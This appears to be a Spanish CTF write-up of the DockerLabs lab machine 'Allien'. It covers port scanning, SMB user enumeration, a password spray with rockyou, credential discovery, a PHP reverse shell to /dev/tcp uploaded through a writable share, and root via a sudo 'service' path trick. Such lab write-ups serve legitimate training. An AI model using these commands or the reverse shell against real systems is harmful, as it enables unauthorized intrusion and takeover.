#MAQUINA #DOCKERLABS #FACIL 
#ENUM4LINUX
#CRACKMAPEXEC #SMBMAP #SMBCLIENT 
<hr>

# RECONOCIMIENTO

Vamos a resolver **Allien** de la plataforma **DockerLabs**.

   ```bash

Máquina desplegada, su dirección IP es --> 172.17.0.2

```

Primero vamos a hacer un escaneo de puertos rápido:

```bash

nmap -sS --min-rate 5000 -vvv -n -Pn -p- 172.17.0.2 --open
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-10 12:11 CET
Initiating ARP Ping Scan at 12:11
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 12:11, 0.06s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 12:11
Scanning 172.17.0.2 [65535 ports]
Discovered open port 445/tcp on 172.17.0.2
Discovered open port 80/tcp on 172.17.0.2
Discovered open port 139/tcp on 172.17.0.2
Discovered open port 22/tcp on 172.17.0.2
Completed SYN Stealth Scan at 12:11, 0.50s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.0000030s latency).
Scanned at 2024-12-10 12:11:03 CET for 0s
Not shown: 65531 closed tcp ports (reset)
PORT    STATE SERVICE      REASON
22/tcp  open  ssh          syn-ack ttl 64
80/tcp  open  http         syn-ack ttl 64
139/tcp open  netbios-ssn  syn-ack ttl 64
445/tcp open  microsoft-ds syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.72 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)


```

- **`--open`**: Muestra solo los puertos abiertos en la salida.
- **`-sS`**: Especifica un escaneo TCP SYN, que es más sigiloso que un escaneo de conexión completa.
- **`--min-rate 5000`**: Establece la tasa mínima de paquetes enviados a 5000 por segundo, haciendo que el escaneo sea más rápido.
- **`-vvv`**: Aumenta el nivel de verbosidad, proporcionando una salida más detallada durante el escaneo.
- **`-n`**: No resuelve DNS; esto evita retrasos por búsquedas de nombres.
- **`-Pn`**: Trata el objetivo como si estuviera en línea; omite el descubrimiento de hosts.
- **`-p-`**: Escanea todos los 65535 puertos en lugar de solo los más comunes.

**Conclusiones:** El ttl al ser 64 nos dice que es una máquina **Linux**. Además, vemos que tiene el puerto **80(HTTP)**, **puerto 139 (SMB)**, **puerto 445(SMB)** y el puerto **22(SSH)** abiertos.

Ahora vamos a hacer un escaneo con mayor detalle:

   ```bash

nmap -sCV -p22,80,139,445 172.17.0.2                      
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-10 12:12 CET
Nmap scan report for pressenter.hl (172.17.0.2)
Host is up (0.000015s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 43:a1:09:2d:be:05:58:1b:01:20:d7:d0:d8:0d:7b:a6 (ECDSA)
|_  256 cd:98:0b:8a:0b:f9:f5:43:e4:44:5d:33:2f:08:2e:ce (ED25519)
80/tcp  open  http        Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Login
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2024-12-10T11:12:32
|_  start_date: N/A
|_nbstat: NetBIOS name: SAMBASERVER, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.48 seconds
                                                               


```

   ```bash

nmap --script="http-enum" 172.17.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-10 12:12 CET
Nmap scan report for pressenter.hl (172.17.0.2)
Host is up (0.0000030s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
| http-enum: 
|_  /info.php: Possible information file
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 02:42:AC:11:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.46 seconds


```

- **`-sC`**: Realiza un escaneo de scripts (Nmap Scripting Engine, NSE). Esto permite ejecutar scripts de `nmap` para obtener información adicional sobre los servicios detectados, como vulnerabilidades, configuraciones o detalles específicos de los mismos.
- **`-sV`**: Realiza la detección de versiones de servicios. Esto intenta identificar la versión exacta del software que está escuchando en un puerto abierto, lo que puede ayudar a determinar si hay vulnerabilidades conocidas.
- **`--script`**:  Ejecutar un script específico.

## HTTP(80)

Al revisar la web que hay en el puerto 80, vemos que no hay nada interesante
## SMB(445)

Utilizamos **enum4linux** :

```bash
[+] Enumerating users using SID S-1-5-21-3519099135-2650601337-1395019858 and logon username '', password ''                                          
                                                                                                                                                      
S-1-5-21-3519099135-2650601337-1395019858-501 SAMBASERVER\nobody (Local User)                                                                         
S-1-5-21-3519099135-2650601337-1395019858-513 SAMBASERVER\None (Domain Group)
S-1-5-21-3519099135-2650601337-1395019858-1000 SAMBASERVER\usuario1 (Local User)
S-1-5-21-3519099135-2650601337-1395019858-1001 SAMBASERVER\usuario2 (Local User)
S-1-5-21-3519099135-2650601337-1395019858-1002 SAMBASERVER\usuario3 (Local User)
S-1-5-21-3519099135-2650601337-1395019858-1003 SAMBASERVER\satriani7 (Local User)
S-1-5-21-3519099135-2650601337-1395019858-1004 SAMBASERVER\administrador (Local User)

```

Utilizamos **crackmapexec** para el usuario **satriani7** :

```bash
crackmapexec smb 172.17.0.2 -u satriani7 -p /usr/share/wordlists/rockyou.txt | grep -vE "FAIL"
SMB                      172.17.0.2      445    SAMBASERVER      [*] Windows 6.1 Build 0 (name:SAMBASERVER) (domain:SAMBASERVER) (signing:False) (SMBv1:False)
SMB                      172.17.0.2      445    SAMBASERVER      [+] SAMBASERVER\satriani7:50cent 
```

Utilizamos **smbmap** para ver que hay:
```bash
smbmap -H 172.17.0.2 -u satriani7 -p 50cent

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 172.17.0.2:445  Name: pressenter.hl             Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        myshare                                                 READ ONLY       Carpeta compartida sin restricciones
        backup24                                                READ ONLY       Privado
        home                                                    NO ACCESS       Produccion
        IPC$                                                    NO ACCESS       IPC Service (EseEmeB Samba Server)
[*] Closed 1 connections
```

Utilizamos **smbclient** para acceder:
```bash
smbclient //172.17.0.2/backup24/ -U satriani7 -p 50cent
```

En Documents > Personal, hay credenciales.

Utilizamos **smbmap** para ver que hay para el usuario administrador con su credencial:
```bash
smbmap -H 172.17.0.2 -u administrador -p Adm1nP4ss2024

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 172.17.0.2:445  Name: pressenter.hl             Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        myshare                                                 READ ONLY       Carpeta compartida sin restricciones
        backup24                                                NO ACCESS       Privado
        home                                                    READ, WRITE     Produccion
        IPC$                                                    NO ACCESS       IPC Service (EseEmeB Samba Server)
[*] Closed 1 connections 
```

Vemos que podemos modificar producción.

# EXPLOTACION

Utilizamos **smbclient** para acceder:
```bash

smbclient //172.17.0.2/home/ -U administrador -p Adm1nP4ss2024

```

Subimos con put una reverse shell mientras nos ponemos en escucha en el puerto 443: 

   ```bash

<?php

/**
* Plugin Name: test-plugin
* Plugin URI: https://www.your-site.com/
* Description: Test.
* Version: 0.1
* Author: your-name
* Author URI: https://www.your-site.com/
**/


	exec("/bin/bash -c 'bash -i > /dev/tcp/172.17.0.1/443 0>&1'");

?>

```

# ESCALADA PRIVILEGIOS

Buscamos archivos con permisos SUDO:
   ```bash
www-data@cb7cc5e03325:/var/www/html$ sudo -l
Matching Defaults entries for www-data on cb7cc5e03325:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User www-data may run the following commands on cb7cc5e03325:
    (ALL) NOPASSWD: /usr/sbin/service

```

Vemos **env** con permisos SUDO :
   ```bash
www-data@cb7cc5e03325:/var/www/html$     sudo service ../../bin/sh

# # whoami
root
# 

```

**YA ESTAMOS COMO ROOT.**
